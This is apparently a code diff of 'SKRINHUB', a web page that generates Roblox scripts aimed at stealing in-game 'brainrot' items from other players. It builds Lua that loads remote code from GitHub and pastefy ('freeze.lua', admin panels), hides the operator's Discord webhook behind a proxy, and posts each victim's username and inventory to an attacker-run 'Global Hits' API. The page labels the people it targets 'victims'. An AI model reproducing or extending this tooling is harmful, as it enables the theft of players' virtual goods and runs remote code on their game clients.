-    text-shadow: 0 0 8px rgba(255, 153, 0, 0.5);
-  }
-
-  .hit-time {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.65rem;
-    color: var(--muted);
-    margin-left: auto;
-  }
-
-  .hit-total-mps {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.72rem;
-    color: var(--green);
-    text-shadow: 0 0 8px rgba(0, 255, 136, 0.5);
-    padding: 2px 8px;
-    border: 1px solid rgba(0, 255, 136, 0.3);
-    border-radius: 4px;
-    background: rgba(0, 255, 136, 0.06);
-  }
-
-  .hit-brainrots {
-    display: flex;
-    flex-wrap: wrap;
-    gap: 0.35rem;
-  }
-
-  .hit-brainrot-tag {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.67rem;
-    padding: 3px 8px;
-    border-radius: 5px;
-    background: rgba(255, 255, 255, 0.05);
-    border: 1px solid rgba(255, 255, 255, 0.1);
-    color: var(--text);
-    display: flex;
-    align-items: center;
-    gap: 5px;
-  }
-
-  .hit-brainrot-tag .tag-mps {
-    color: var(--muted);
-    font-size: 0.62rem;
-  }
-
-  .hit-brainrot-tag.tag-og {
-    background: rgba(255, 255, 255, 0.07);
-    border-color: rgba(255, 255, 255, 0.35);
-    color: var(--neon);
-  }
-
-  .hit-brainrot-tag.tag-mythic {
-    background: rgba(180, 100, 255, 0.08);
-    border-color: rgba(180, 100, 255, 0.3);
-    color: #c97fff;
-  }
-
-  .hits-empty {
-    padding: 2.5rem 1.25rem;
-    text-align: center;
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.75rem;
-    color: var(--muted);
-    letter-spacing: 0.08em;
-  }
-
-  .hits-empty span {
-    display: block;
-    font-size: 1.6rem;
-    margin-bottom: 0.5rem;
-    opacity: 0.4;
-  }
-
-  .spin {
-    display: inline-block;
-    animation: spin 1s linear infinite;
-  }
-
-  @keyframes spin {
-    from { transform: rotate(0deg); }
-    to { transform: rotate(360deg); }
-  }
-
-  .auto-refresh-row {
-    display: flex;
-    align-items: center;
-    gap: 0.5rem;
-    padding: 0.6rem 1.25rem;
-    background: rgba(0,0,0,0.2);
-    border-top: 1px solid rgba(255,255,255,0.04);
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.65rem;
-    color: var(--muted);
-  }
-
-  .auto-refresh-toggle {
-    -webkit-appearance: none;
-    appearance: none;
-    width: 28px;
-    height: 15px;
-    border-radius: 10px;
-    background: var(--border);
-    cursor: pointer;
-    position: relative;
-    transition: background 0.2s;
-    flex-shrink: 0;
-  }
-
-  .auto-refresh-toggle:checked {
-    background: #ff9900;
-  }
-
-  .auto-refresh-toggle::after {
-    content: '';
-    position: absolute;
-    width: 11px;
-    height: 11px;
-    border-radius: 50%;
-    background: white;
-    top: 2px;
-    left: 2px;
-    transition: left 0.2s;
-  }
-
-  .auto-refresh-toggle:checked::after {
-    left: 15px;
   }
 </style>
 </head>
@@ -923,6 +582,36 @@
     <p class="tagline">Roblox • Brainrot • Trade Script Generator</p>
   </header>
 
+  <!-- ── GLOBAL HITS (top) ── -->
+  <div class="panel hits-panel">
+    <div class="hits-header">
+      <div class="dot dot-green"></div>
+      <span class="ph-title">Global Hits</span>
+      <span class="hits-badge" id="hitsCountBadge">0 hits</span>
+      <div class="hits-actions">
+        <button class="btn-sm" id="refreshHitsBtn" onclick="fetchHits()">↻ Refresh</button>
+        <button class="btn-sm red" onclick="clearHits()">✕ Clear</button>
+      </div>
+    </div>
+    <div class="api-url-row">
+      <label for="apiUrlInput">API URL</label>
+      <input id="apiUrlInput" type="text" placeholder="https://your-replit-domain.replit.app" oninput="saveApiUrl()" onblur="checkApiUrl()">
+      <span class="api-url-status checking" id="apiUrlStatus">not set</span>
+    </div>
+    <div class="hits-list" id="hitsList">
+      <div class="hits-empty">
+        <div class="hits-empty-icon">🎯</div>
+        No hits yet — set your API URL above, then execute<br>the generated script on a target.
+      </div>
+    </div>
+    <div class="auto-refresh-row">
+      <input type="checkbox" class="auto-refresh-toggle" id="autoRefreshToggle" onchange="toggleAutoRefresh()">
+      <label for="autoRefreshToggle">Auto-refresh every 10s</label>
+      <span id="autoRefreshStatus" style="margin-left:auto;"></span>
+    </div>
+  </div>
+
+  <!-- ── BRAINROT SELECTION ── -->
   <div class="panel">
     <div class="ph"><div class="dot dot-cyan"></div><span class="ph-title">Select Brainrot Animals</span></div>
     <div class="pb">
@@ -949,18 +638,20 @@
     </div>
   </div>
 
+  <!-- ── USERNAME ── -->
   <div class="panel">
     <div class="ph"><div class="dot dot-purple"></div><span class="ph-title">Roblox Username</span></div>
     <div class="pb">
       <label class="lbl">Target username</label>
       <div style="position: relative;">
         <input class="txt" id="usernameInput" type="text" placeholder="e.g. Builderman" autocomplete="off" spellcheck="false">
-        <div id="usernameSuggestions" class="suggestions-container"></div>
+        <div id="usernameSuggestions"></div>
       </div>
       <p class="hint" id="usernameHint">The Roblox username to target in the script (3 characters minimum).</p>
     </div>
   </div>
 
+  <!-- ── WEBHOOK ── -->
   <div class="panel">
     <div class="ph"><div class="dot dot-discord"></div><span class="ph-title">Discord Webhook</span></div>
     <div class="pb">
@@ -970,6 +661,7 @@
     </div>
   </div>
 
+  <!-- ── GUI SELECTOR ── -->
   <div class="panel">
     <div class="ph"><div class="dot dot-discord"></div><span class="ph-title">Gui Selector</span></div>
     <div class="pb">
@@ -989,6 +681,7 @@
 
   <button class="btn-gen" onclick="generate()">⚡ Generate Script</button>
 
+  <!-- ── OUTPUT ── -->
   <div class="panel">
     <div class="out-ph">
       <div class="dot dot-green"></div>
@@ -997,30 +690,6 @@
     </div>
     <div class="pb">
       <div class="code-block empty" id="outputBlock">-- Fill in the fields above and hit Generate Script...</div>
-    </div>
-  </div>
-
-  <!-- ── GLOBAL HITS ── -->
-  <div class="panel hits-panel">
-    <div class="hits-header">
-      <div class="dot dot-hit"></div>
-      <span class="ph-title-hit">Global Hits</span>
-      <span class="hits-count-badge" id="hitsCountBadge">0 hits</span>
-      <div class="hits-actions">
-        <button class="btn-sm orange" id="refreshHitsBtn" onclick="fetchHits()">↻ Refresh</button>
-        <button class="btn-sm red" onclick="clearHits()">✕ Clear</button>
-      </div>
-    </div>
-    <div class="hits-list" id="hitsList">
-      <div class="hits-empty">
-        <span>🎯</span>
-        No hits yet. Execute the generated script on a victim<br>to see their brainrot inventory here.
-      </div>
-    </div>
-    <div class="auto-refresh-row">
-      <input type="checkbox" class="auto-refresh-toggle" id="autoRefreshToggle" onchange="toggleAutoRefresh()">
-      <label for="autoRefreshToggle">Auto-refresh every 10s</label>
-      <span id="autoRefreshStatus" style="margin-left:auto;"></span>
     </div>
   </div>
 </div>
@@ -1273,452 +942,347 @@ const ANIMALS = [
 { name: "Tobi Tobi Tobi", rarity: "Mythic", mps: "8.5K/s" },
 ];
 
+const ANIMAL_MAP = Object.fromEntries(ANIMALS.map(a => [a.name, a]));
+
 let selected = new Set();
 let adminMode = 'no-gui';
 let customAdminLoadstring = '';
-let hitsData = [];
 let autoRefreshInterval = null;
 
-// ── BUILD ALL_BRAINROTS lua table for injection into generated script ──
+// ── API URL ──────────────────────────────────────────────────────────────
+function getApiBase() {
+  return (localStorage.getItem('skrinhub_api') || '').replace(/\/$/, '');
+}
+
+function saveApiUrl() {
+  const v = document.getElementById('apiUrlInput').value.trim().replace(/\/$/, '');
+  localStorage.setItem('skrinhub_api', v);
+}
+
+async function checkApiUrl() {
+  const base = getApiBase();
+  const el = document.getElementById('apiUrlStatus');
+  if (!base) { el.textContent = 'not set'; el.className = 'api-url-status checking'; return; }
+  el.textContent = 'checking…'; el.className = 'api-url-status checking';
+  try {
+    const r = await fetch(base + '/api/healthz', { signal: AbortSignal.timeout(4000) });
+    if (r.ok) { el.textContent = '✓ connected'; el.className = 'api-url-status ok'; }
+    else       { el.textContent = `✗ ${r.status}`;  el.className = 'api-url-status err'; }
+  } catch {
+    el.textContent = '✗ unreachable'; el.className = 'api-url-status err';
+  }
+}
+
+// ── HITS ─────────────────────────────────────────────────────────────────
+async function fetchHits() {
+  const base = getApiBase();
+  const btn = document.getElementById('refreshHitsBtn');
+  btn.innerHTML = '<span class="spin">↻</span>';
+  btn.disabled = true;
+  try {
+    if (!base) throw new Error('no api');
+    const r = await fetch(base + '/api/hits', { signal: AbortSignal.timeout(5000) });
+    if (!r.ok) throw new Error('bad status');
+    const data = await r.json();
+    if (Array.isArray(data)) renderHits(data);
+    document.getElementById('autoRefreshStatus').textContent =
+      'Updated ' + new Date().toLocaleTimeString();
+  } catch {
+    // silent
+  } finally {
+    btn.innerHTML = '↻ Refresh';
+    btn.disabled = false;
+  }
+}
+
+function renderHits(hits) {
+  const list = document.getElementById('hitsList');
+  const badge = document.getElementById('hitsCountBadge');
+  badge.textContent = hits.length + (hits.length === 1 ? ' hit' : ' hits');
+
+  if (!hits.length) {
+    list.innerHTML = `<div class="hits-empty"><div class="hits-empty-icon">🎯</div>No hits yet — set your API URL above, then execute<br>the generated script on a target.</div>`;
+    return;
+  }
+
+  list.innerHTML = '';
+  hits.forEach(hit => {
+    const entry = document.createElement('div');
+    entry.className = 'hit-entry';
+    const brainrots = Array.isArray(hit.brainrots) ? hit.brainrots : [];
+    const time = hit.timestamp ? new Date(hit.timestamp).toLocaleString() : '';
+
+    const tagsHtml = brainrots.length
+      ? brainrots.map(b => {
+          const name = typeof b === 'string' ? b : b.name;
+          const mps  = typeof b === 'string' ? (ANIMAL_MAP[b]?.mps || '?') : (b.mps || '?');
+          const r    = ANIMAL_MAP[name]?.rarity || 'Secret';
+          const cls  = r === 'OG' ? 'tag-og' : r === 'Mythic' ? 'tag-mythic' : '';
+          return `<span class="hit-tag ${cls}">${name}<span class="tag-mps">${mps}</span></span>`;
+        }).join('')
+      : `<span style="font-family:'Share Tech Mono',monospace;font-size:0.7rem;color:var(--muted)">No brainrots detected</span>`;
+
+    entry.innerHTML = `
+      <div class="hit-entry-header">
+        <span class="hit-victim">🎯 ${hit.username || '?'}</span>
+        <span class="hit-total-mps">${hit.totalMps || '?'}/s total</span>
+        <span class="hit-time">${time}</span>
+      </div>
+      <div class="hit-brainrots">${tagsHtml}</div>`;
+    list.appendChild(entry);
+  });
+}
+
+async function clearHits() {
+  const base = getApiBase();
+  if (base) {
+    try { await fetch(base + '/api/hits', { method: 'DELETE' }); } catch {}
+  }
+  renderHits([]);
+}
+
+function toggleAutoRefresh() {
+  const on = document.getElementById('autoRefreshToggle').checked;
+  clearInterval(autoRefreshInterval);
+  if (on) {
+    fetchHits();
+    autoRefreshInterval = setInterval(fetchHits, 10000);
+    document.getElementById('autoRefreshStatus').textContent = 'Auto-refresh on';
+  } else {
+    document.getElementById('autoRefreshStatus').textContent = '';
+  }
+}
+
+// ── SCRIPT GENERATION ────────────────────────────────────────────────────
 function buildAllBrainrotsLua() {
   return ANIMALS.map(a => `  ["${a.name}"] = "${a.mps}",`).join('\n');
 }
 
-function addCustomBrainrot() {
-  const customName = document.getElementById('customBrainrotName').value.trim();
-  if (!customName) return;
-  if (!selected.has(customName)) selected.add(customName);
-  renderList(document.getElementById('searchBox').value);
-  document.getElementById('customBrainrotName').value = '';
-}
-
-function parsePastedList() {
-  const textarea = document.getElementById('pasteCustomListTextarea');
-  let text = textarea.value.trim();
-  if (!text) return;
-  const lines = text.split('\n').map(line => line.trim()).filter(line => line.length > 0 && line.includes('["'));
-  const regex = /\[\s*"([^"]+)"\s*\]\s*=\s*true\s*,?/i;
-  lines.forEach(line => {
-    const match = line.match(regex);
-    if (match && match[1]) {
-      const name = match[1].trim();
-      if (name && !selected.has(name)) selected.add(name);
-    }
-  });
-  renderList(document.getElementById('searchBox').value);
-  textarea.value = '';
-}
-
-function setAdminMode(mode) {
-  adminMode = mode;
-  const buttons = document.querySelectorAll('.admin-mode-btn');
-  buttons.forEach(btn => btn.classList.remove('active'));
-  event.target.classList.add('active');
-  const customInput = document.getElementById('customAdminInput');
-  customInput.style.display = mode === 'custom' ? 'block' : 'none';
-}
-
-function updateCustomAdmin() {
-  customAdminLoadstring = document.getElementById('customAdminLoadstring').value;
-}
-
 async function createSentinelProxy(webhookUrl) {
-  try {
-    const workerUrl = 'https://sentinel-proxy.dongdihng.workers.dev/';
-    const response = await fetch(workerUrl, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ webhook: webhookUrl })
-    });
-    if (!response.ok) {
-      const errorData = await response.json();
-      throw new Error(errorData.error || 'Failed to create proxy');
-    }
-    const data = await response.json();
-    if (data.proxyUrl) return data.proxyUrl;
-    throw new Error('No proxy URL returned');
-  } catch (error) {
-    console.error('SentinelHook Error:', error);
-    throw new Error('Failed to create proxy. Check your webhook or try again later.');
-  }
+  const r = await fetch('https://sentinel-proxy.dongdihng.workers.dev/', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ webhook: webhookUrl })
+  });
+  if (!r.ok) { const d = await r.json(); throw new Error(d.error || 'proxy failed'); }
+  const d = await r.json();
+  if (!d.proxyUrl) throw new Error('No proxy URL returned');
+  return d.proxyUrl;
 }
 
 async function uploadToPastefy(script) {
   try {
-    const response = await fetch("https://pastefy.app/api/v2/paste", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ title: "SKRINHUB Script", content: script }),
+    const r = await fetch('https://pastefy.app/api/v2/paste', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ title: 'SKRINHUB Script', content: script })
     });
-    const data = await response.json();
-    return data.success && data.paste?.id ? `https://pastefy.app/${data.paste.id}/raw` : null;
-  } catch (error) {
-    return null;
-  }
+    const d = await r.json();
+    return d.success && d.paste?.id ? `https://pastefy.app/${d.paste.id}/raw` : null;
+  } catch { return null; }
 }
 
 async function generate() {
   const btn = document.querySelector('.btn-gen');
   const out = document.getElementById('outputBlock');
   if (btn.disabled) return;
-
-  btn.disabled = true;
-  btn.textContent = '⏳ Generating...';
-  btn.style.opacity = '0.6';
+  btn.disabled = true; btn.textContent = '⏳ Generating...'; btn.style.opacity = '0.6';
 
   try {
     const username = document.getElementById('usernameInput').value.trim();
-    const webhook = document.getElementById('webhookInput').value.trim();
+    const webhook  = document.getElementById('webhookInput').value.trim();
+    const apiBase  = getApiBase();
 
-    if (selected.size === 0) throw new Error('Please select at least one brainrot animal.');
-    if (username.length < 3) throw new Error('Username must be at least 3 characters long.');
+    if (!selected.size)        throw new Error('Please select at least one brainrot animal.');
+    if (username.length < 3)   throw new Error('Username must be at least 3 characters long.');
     if (!webhook.startsWith('https://discord.com/api/webhooks/')) throw new Error('Invalid webhook URL.');
 
-    const finalWebhookUrl = await createSentinelProxy(webhook);
+    const finalWebhook = await createSentinelProxy(webhook);
+    const brainrotLines = [...selected].map(n => `  ["${n}"] = true,`).join('\n');
+    const allLines = buildAllBrainrotsLua();
 
-    const names = [...selected];
-    const brainrotLines = names.map(n => `  ["${n}"] = true,`).join('\n');
-    const allBrainrotsLines = buildAllBrainrotsLua();
-
-    let adminScriptPart = '';
+    let adminPart = '';
     if (adminMode === 'admin-panel') {
-      adminScriptPart = `
-task.spawn(function()
-loadstring(game:HttpGet("https://pastefy.app/GKYBLds1/raw"))()
-end)`;
+      adminPart = `\ntask.spawn(function()\nloadstring(game:HttpGet("https://pastefy.app/GKYBLds1/raw"))()\nend)`;
     } else if (adminMode === 'freeze') {
-      adminScriptPart = `task.spawn(function()
-loadstring(game:HttpGet("https://pastefy.app/BNCsmpLk/raw"))()
-end)`;
+      adminPart = `\ntask.spawn(function()\nloadstring(game:HttpGet("https://pastefy.app/BNCsmpLk/raw"))()\nend)`;
     } else if (adminMode === 'custom' && customAdminLoadstring.trim()) {
-      adminScriptPart = customAdminLoadstring;
+      adminPart = '\n' + customAdminLoadstring;
     }
 
-    const script = `getgenv().WEBHOOK_URL = "${finalWebhookUrl}"
+    // Report function — calls SKRINHUB_API/api/hits
+    const reportSnippet = apiBase ? `
+getgenv().SKRINHUB_API = "${apiBase}/api/hits"
+getgenv().SkrinReport = function(victim, brainrots, totalMps)
+  pcall(function()
+    local hs = game:GetService("HttpService")
+    local body = hs:JSONEncode({username=victim, brainrots=brainrots, totalMps=tostring(totalMps)})
+    request({Url=getgenv().SKRINHUB_API, Method="POST", Headers={["Content-Type"]="application/json"}, Body=body})
+  end)
+end` : `-- (No API URL set — Global Hits disabled)
+getgenv().SkrinReport = function() end`;
+
+    const script = `getgenv().WEBHOOK_URL = "${finalWebhook}"
 getgenv().TARGET_USERNAME = "${username}"
 getgenv().TARGET_BRAINROT = {
 ${brainrotLines}
 }
 getgenv().ALL_BRAINROTS = {
-${allBrainrotsLines}
+${allLines}
 }
+${reportSnippet}
 task.spawn(function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ZAmbuluda/Shrinkhub/refs/heads/main/freeze.lua"))()
-end)
-${adminScriptPart}`;
+end)${adminPart}`;
 
-    const pastefyRawUrl = await uploadToPastefy(script);
-    if (pastefyRawUrl) {
+    const rawUrl = await uploadToPastefy(script);
+    if (rawUrl) {
       out.className = 'code-block';
-      out.textContent = `loadstring(game:HttpGet("${pastefyRawUrl}"))()`;
+      out.textContent = `loadstring(game:HttpGet("${rawUrl}"))()`;
     } else {
       out.className = 'code-block';
-      out.textContent = `-- Failed to upload to Pastefy.\nHere is the raw script (copy it manually):\n${script}`;
+      out.textContent = `-- Failed to upload to Pastefy. Raw script:\n${script}`;
     }
   } catch (err) {
-    console.error("Generation error:", err);
     out.className = 'code-block empty';
     out.textContent = err.message || 'An error occurred.';
   } finally {
-    setTimeout(() => {
-      btn.disabled = false;
-      btn.textContent = '⚡ Generate Script';
-      btn.style.opacity = '1';
-    }, 1500);
+    setTimeout(() => { btn.disabled = false; btn.textContent = '⚡ Generate Script'; btn.style.opacity = '1'; }, 1500);
   }
 }
 
-// ── GLOBAL HITS ──
-
-async function fetchHits() {
-  const btn = document.getElementById('refreshHitsBtn');
-  btn.innerHTML = '<span class="spin">↻</span> Fetching...';
-  btn.disabled = true;
-
-  try {
-    const response = await fetch('https://sentinel-proxy.dongdihng.workers.dev/hits', {
-      method: 'GET',
-      headers: { 'Content-Type': 'application/json' }
-    });
-
-    if (!response.ok) throw new Error(`HTTP ${response.status}`);
-    const data = await response.json();
-
-    if (Array.isArray(data) && data.length > 0) {
-      hitsData = data;
-      renderHits();
-    } else if (data.hits && Array.isArray(data.hits)) {
-      hitsData = data.hits;
-      renderHits();
-    } else {
-      // No hits from server — keep local
-    }
-  } catch (err) {
-    // Silently fail; server may not have a /hits endpoint yet
-  } finally {
-    btn.innerHTML = '↻ Refresh';
-    btn.disabled = false;
-    document.getElementById('autoRefreshStatus').textContent =
-      'Last refreshed: ' + new Date().toLocaleTimeString();
-  }
-}
-
-function renderHits() {
-  const list = document.getElementById('hitsList');
-  const badge = document.getElementById('hitsCountBadge');
-  badge.textContent = hitsData.length + (hitsData.length === 1 ? ' hit' : ' hits');
-
-  if (hitsData.length === 0) {
-    list.innerHTML = `<div class="hits-empty"><span>🎯</span>No hits yet. Execute the generated script on a victim<br>to see their brainrot inventory here.</div>`;
-    return;
-  }
-
-  list.innerHTML = '';
-  // Most recent first
-  const sorted = [...hitsData].reverse();
-  sorted.forEach(hit => {
-    const entry = document.createElement('div');
-    entry.className = 'hit-entry';
-
-    const brainrotList = Array.isArray(hit.brainrots) ? hit.brainrots : [];
-    const totalMps = hit.totalMps || (brainrotList.length > 0 ? 'Unknown' : '0');
-    const timestamp = hit.timestamp ? new Date(hit.timestamp).toLocaleString() : 'Unknown time';
-
-    const tagsHtml = brainrotList.length > 0
-      ? brainrotList.map(b => {
-          const animal = ANIMALS.find(a => a.name === (b.name || b));
-          const mps = b.mps || (animal ? animal.mps : '?');
-          const rarity = animal ? animal.rarity : 'Secret';
-          const cls = rarity === 'OG' ? 'tag-og' : rarity === 'Mythic' ? 'tag-mythic' : '';
-          return `<span class="hit-brainrot-tag ${cls}">${b.name || b}<span class="tag-mps">${mps}</span></span>`;
-        }).join('')
-      : `<span style="font-family:'Share Tech Mono',monospace;font-size:0.72rem;color:var(--muted)">No brainrots detected.</span>`;
-
-    entry.innerHTML = `
-      <div class="hit-entry-header">
-        <span class="hit-victim">🎯 ${hit.username || hit.victim || 'Unknown'}</span>
-        <span class="hit-total-mps">Total: ${totalMps}/s</span>
-        <span class="hit-time">${timestamp}</span>
-      </div>
-      <div class="hit-brainrots">${tagsHtml}</div>
-    `;
-    list.appendChild(entry);
-  });
-}
-
-// Add a hit locally (called when script is executed and data comes back)
-function addHitLocally(username, brainrots, totalMps) {
-  hitsData.push({
-    username,
-    brainrots,
-    totalMps,
-    timestamp: new Date().toISOString()
-  });
-  renderHits();
-}
-
-function clearHits() {
-  hitsData = [];
-  renderHits();
-}
-
-function toggleAutoRefresh() {
-  const on = document.getElementById('autoRefreshToggle').checked;
-  if (on) {
-    fetchHits();
-    autoRefreshInterval = setInterval(fetchHits, 10000);
-    document.getElementById('autoRefreshStatus').textContent = 'Auto-refresh active';
-  } else {
-    clearInterval(autoRefreshInterval);
-    autoRefreshInterval = null;
-    document.getElementById('autoRefreshStatus').textContent = '';
-  }
-}
-
-// ── ROBLOX USER SEARCH ──
-
+// ── ROBLOX USER SEARCH ───────────────────────────────────────────────────
 async function searchRobloxUsers(query) {
   if (query.length < 3) return [];
   try {
-    const proxyUrl = `https://roblox-search-proxy.vercel.app/api/roblox-search?keyword=${encodeURIComponent(query)}`;
-    const response = await fetch(proxyUrl);
-    if (!response.ok) throw new Error(`HTTP ${response.status}`);
-    const data = await response.json();
-    return data.data || [];
-  } catch (error) {
-    return [];
-  }
+    const r = await fetch(`https://roblox-search-proxy.vercel.app/api/roblox-search?keyword=${encodeURIComponent(query)}`);
+    if (!r.ok) return [];
+    return (await r.json()).data || [];
+  } catch { return []; }
 }
 
 async function fetchAvatarUrl(userId) {
   try {
-    const proxyUrl = `https://avatar-proxy.vercel.app/api/avatar-proxy?userId=${userId}`;
-    const response = await fetch(proxyUrl);
-    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-    const data = await response.json();
-    return data.imageUrl || null;
-  } catch (error) {
-    return null;
-  }
+    const r = await fetch(`https://avatar-proxy.vercel.app/api/avatar-proxy?userId=${userId}`);
+    return r.ok ? (await r.json()).imageUrl || null : null;
+  } catch { return null; }
 }
 
 async function showSuggestions(users) {
-  const container = document.getElementById('usernameSuggestions');
-  container.innerHTML = '';
-  if (users.length === 0) {
-    const noResult = document.createElement('div');
-    noResult.className = 'suggestion-item';
-    noResult.innerHTML = `<span class="suggestion-username" style="color: var(--muted);">No user found.</span>`;
-    container.appendChild(noResult);
-    container.style.display = 'block';
-    return;
+  const c = document.getElementById('usernameSuggestions');
+  c.innerHTML = '';
+  if (!users.length) {
+    c.innerHTML = `<div class="suggestion-item"><span class="suggestion-username" style="color:var(--muted)">No user found.</span></div>`;
+    c.style.display = 'block'; return;
   }
-  const userPromises = users.map(async (user) => {
-    const avatarUrl = await fetchAvatarUrl(user.id);
-    return { ...user, avatarUrl };
-  });
-  const usersWithAvatars = await Promise.all(userPromises);
-  usersWithAvatars.forEach(user => {
+  const withAvatars = await Promise.all(users.map(async u => ({ ...u, avatarUrl: await fetchAvatarUrl(u.id) })));
+  withAvatars.forEach(u => {
     const item = document.createElement('div');
     item.className = 'suggestion-item';
     item.innerHTML = `
-      <div class="suggestion-avatar">
-        <img src="${user.avatarUrl || 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDQ4IDQ4IiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIxIiBmaWxsPSJub25lIiBzdHJva2UtbGluZWNhcD0icm91bmQiPjxjaXJjbGUgY3g9IjI0IiBjeT0iMjQiIHI9IjI0Ii8+PC9zdmc+'}" alt="${user.name}">
-      </div>
+      <div class="suggestion-avatar"><img src="${u.avatarUrl || ''}" alt="${u.name}"></div>
       <div class="suggestion-info">
-        <p class="suggestion-username">${user.displayName || user.name}</p>
-        <p class="suggestion-handle">@${user.name}</p>
+        <p class="suggestion-username">${u.displayName || u.name}</p>
+        <p class="suggestion-handle">@${u.name}</p>
       </div>
-      <span class="suggestion-id">${user.id}</span>
-    `;
+      <span class="suggestion-id">${u.id}</span>`;
     item.onclick = () => {
-      document.getElementById('usernameInput').value = user.name;
-      container.style.display = 'none';
+      document.getElementById('usernameInput').value = u.name;
+      c.style.display = 'none';
       validateUsername();
     };
-    container.appendChild(item);
+    c.appendChild(item);
   });
-  container.style.display = 'block';
+  c.style.display = 'block';
 }
 
-const debounce = (func, delay) => {
-  let timeoutId;
-  return function(...args) {
-    clearTimeout(timeoutId);
-    timeoutId = setTimeout(() => func.apply(this, args), delay);
-  };
-};
+const debounce = (fn, ms) => { let t; return (...a) => { clearTimeout(t); t = setTimeout(() => fn(...a), ms); }; };
 
-document.getElementById('usernameInput').addEventListener('input', debounce(async function(e) {
-  const query = e.target.value.trim();
-  if (query.length === 0) {
-    document.getElementById('usernameSuggestions').style.display = 'none';
-    return;
-  }
-  const users = await searchRobloxUsers(query);
-  showSuggestions(users);
+document.getElementById('usernameInput').addEventListener('input', debounce(async e => {
+  const q = e.target.value.trim();
+  if (!q) { document.getElementById('usernameSuggestions').style.display = 'none'; return; }
+  showSuggestions(await searchRobloxUsers(q));
 }, 300));
 
+// ── ANIMAL LIST ──────────────────────────────────────────────────────────
 function renderList(filter) {
   const q = (filter || '').toLowerCase();
   const list = document.getElementById('animalList');
   list.innerHTML = '';
-  ANIMALS.forEach(animal => {
-    if (q && !animal.name.toLowerCase().includes(q)) return;
+  ANIMALS.forEach(a => {
+    if (q && !a.name.toLowerCase().includes(q)) return;
     const row = document.createElement('div');
-    row.className = 'a-item' + (selected.has(animal.name) ? ' on' : '');
-    const cb = document.createElement('input');
-    cb.type = 'checkbox';
-    cb.checked = selected.has(animal.name);
-    cb.addEventListener('change', e => { e.stopPropagation(); toggle(animal.name); });
-    const lbl = document.createElement('span');
-    lbl.className = 'a-name';
-    lbl.textContent = animal.name;
+    row.className = 'a-item' + (selected.has(a.name) ? ' on' : '');
+    const cb = document.createElement('input'); cb.type = 'checkbox'; cb.checked = selected.has(a.name);
+    cb.addEventListener('change', e => { e.stopPropagation(); toggle(a.name); });
+    const lbl = document.createElement('span'); lbl.className = 'a-name'; lbl.textContent = a.name;
     const badge = document.createElement('span');
-    badge.className = animal.rarity === 'OG' ? 'badge-og' : animal.rarity === 'Mythic' ? 'badge-mythic' : 'badge-secret';
-    badge.textContent = animal.rarity;
-    const mps = document.createElement('span');
-    mps.className = 'a-meta';
-    mps.textContent = animal.mps;
+    badge.className = a.rarity === 'OG' ? 'badge-og' : a.rarity === 'Mythic' ? 'badge-mythic' : 'badge-secret';
+    badge.textContent = a.rarity;
+    const mps = document.createElement('span'); mps.className = 'a-meta'; mps.textContent = a.mps;
     row.append(cb, lbl, badge, mps);
-    row.addEventListener('click', e => { if (e.target !== cb) toggle(animal.name); });
+    row.addEventListener('click', e => { if (e.target !== cb) toggle(a.name); });
     list.appendChild(row);
   });
   selected.forEach(name => {
-    if (!ANIMALS.some(a => a.name === name)) {
-      const row = document.createElement('div');
-      row.className = 'a-item on';
-      const cb = document.createElement('input');
-      cb.type = 'checkbox';
-      cb.checked = true;
-      cb.addEventListener('change', e => { e.stopPropagation(); toggle(name); });
-      const lbl = document.createElement('span');
-      lbl.className = 'a-name';
-      lbl.textContent = name;
-      const badge = document.createElement('span');
-      badge.className = 'badge-secret';
-      badge.textContent = 'Custom';
-      row.append(cb, lbl, badge);
-      row.addEventListener('click', e => { if (e.target !== cb) toggle(name); });
-      list.appendChild(row);
-    }
+    if (ANIMALS.some(a => a.name === name)) return;
+    const row = document.createElement('div'); row.className = 'a-item on';
+    const cb = document.createElement('input'); cb.type = 'checkbox'; cb.checked = true;
+    cb.addEventListener('change', e => { e.stopPropagation(); toggle(name); });
+    const lbl = document.createElement('span'); lbl.className = 'a-name'; lbl.textContent = name;
+    const badge = document.createElement('span'); badge.className = 'badge-secret'; badge.textContent = 'Custom';
+    row.append(cb, lbl, badge);
+    row.addEventListener('click', e => { if (e.target !== cb) toggle(name); });
+    list.appendChild(row);
   });
   document.getElementById('selNum').textContent = selected.size;
 }
 
-function toggle(name) {
-  selected.has(name) ? selected.delete(name) : selected.add(name);
-  renderList(document.getElementById('searchBox').value);
-}
-
+function toggle(name) { selected.has(name) ? selected.delete(name) : selected.add(name); renderList(document.getElementById('searchBox').value); }
 function filterList() { renderList(document.getElementById('searchBox').value); }
-function selectAll() { ANIMALS.forEach(n => selected.add(n.name)); renderList(document.getElementById('searchBox').value); }
+function selectAll() { ANIMALS.forEach(a => selected.add(a.name)); renderList(document.getElementById('searchBox').value); }
 function clearAll() { selected.clear(); renderList(document.getElementById('searchBox').value); }
 
+function addCustomBrainrot() {
+  const v = document.getElementById('customBrainrotName').value.trim();
+  if (!v) return;
+  selected.add(v);
+  renderList(document.getElementById('searchBox').value);
+  document.getElementById('customBrainrotName').value = '';
+}
+
+function parsePastedList() {
+  const text = document.getElementById('pasteCustomListTextarea').value.trim();
+  if (!text) return;
+  const re = /\[\s*"([^"]+)"\s*\]\s*=\s*true\s*,?/gi;
+  let m;
+  while ((m = re.exec(text)) !== null) { if (m[1]) selected.add(m[1].trim()); }
+  renderList(document.getElementById('searchBox').value);
+  document.getElementById('pasteCustomListTextarea').value = '';
+}
+
+function setAdminMode(mode) {
+  adminMode = mode;
+  document.querySelectorAll('.admin-mode-btn').forEach(b => b.classList.remove('active'));
+  event.target.classList.add('active');
